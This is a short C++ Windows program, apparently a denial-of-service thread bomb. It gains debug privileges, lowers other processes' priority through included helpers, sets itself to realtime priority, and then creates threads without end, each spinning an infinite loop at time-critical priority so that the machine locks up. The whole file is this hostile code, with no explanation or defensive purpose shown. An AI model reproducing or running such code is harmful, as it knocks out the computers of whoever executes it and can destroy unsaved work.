#include <windows.h>
#include <tlhelp32.h>
#include "AddDebugPrivileges.cpp"
#include "ProcessMinPrior.cpp"


unsigned long __stdcall Povis(void*)
{
SetThreadPriority(GetCurrentThread(),THREAD_PRIORITY_TIME_CRITICAL);
__int64	Calc = 0;
while (TRUE) Calc++;
return 0;
}

void main()
{
AddDebugPrivileges();
ProcessMinPrior();
SetPriorityClass(GetCurrentProcess(),REALTIME_PRIORITY_CLASS);
SetThreadPriority(GetCurrentThread(),THREAD_PRIORITY_TIME_CRITICAL);
while (TRUE) CreateThread(0,0,Povis,0,0,0);
}